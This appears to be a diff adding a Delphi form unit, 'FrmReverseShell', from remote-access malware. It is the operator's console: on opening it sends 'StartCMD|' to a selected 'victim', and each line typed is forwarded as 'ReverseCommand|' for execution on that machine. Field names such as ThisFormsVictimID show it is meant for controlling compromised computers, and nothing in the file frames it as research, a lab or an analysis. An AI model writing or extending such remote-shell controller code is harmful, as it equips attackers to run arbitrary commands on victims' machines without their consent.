@@ -1,0 +1,90 @@
+unit FrmReverseShell;
+
+interface
+
+uses
+  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
+  System.Classes, Vcl.Graphics,
+  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls;
+
+type
+  TForm11 = class(TForm)
+    Memo1: TMemo;
+    Edit1: TEdit;
+    procedure FormCreate(Sender: TObject);
+    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
+    procedure FormClose(Sender: TObject; var Action: TCloseAction);
+  private
+    { Private declarations }
+  public
+    ThisFormsVictimID: string;
+  end;
+
+var
+  Form11: TForm11;
+
+implementation
+
+{$R *.dfm}
+
+uses FrmMain;
+
+procedure SendToSelectedClient(const VictimID, Msg: string);
+var
+  I: Integer;
+  NickName: string;
+  UserData: TConnectedUserData;
+begin
+  NickName := VictimID;
+  for I := 0 to Form1.ConnectedUsers.Count - 1 do
+  begin
+    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
+    if UserData.ID = NickName then
+    begin
+      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
+      Exit;
+    end;
+  end;
+end;
+
+procedure TForm11.Edit1KeyPress(Sender: TObject; var Key: Char);
+var
+  Command: string;
+begin
+  if Key = #13 then // if the Enter key is pressed
+  begin
+    Key := #0;
+    Command := Edit1.text;
+
+    if Command.ToLower = 'cls' then
+    begin
+      self.Memo1.clear;
+      self.Edit1.clear;
+      self.Edit1.SetFocus;
+      Exit;
+    end;
+
+    if Command.ToLower = 'exit' then
+    begin
+      self.Close;
+      Exit;
+    end;
+
+    self.Memo1.Lines.Add('>>> ' + Command);
+    SendToSelectedClient(ThisFormsVictimID, 'ReverseCommand|' + Command);
+    self.Edit1.clear;
+    self.Edit1.SetFocus;
+  end;
+end;
+
+procedure TForm11.FormClose(Sender: TObject; var Action: TCloseAction);
+begin
+  Action := cafree;
+end;
+
+procedure TForm11.FormCreate(Sender: TObject);
+begin
+  SendToSelectedClient(ThisFormsVictimID, 'StartCMD|');
+end;
+
+end.
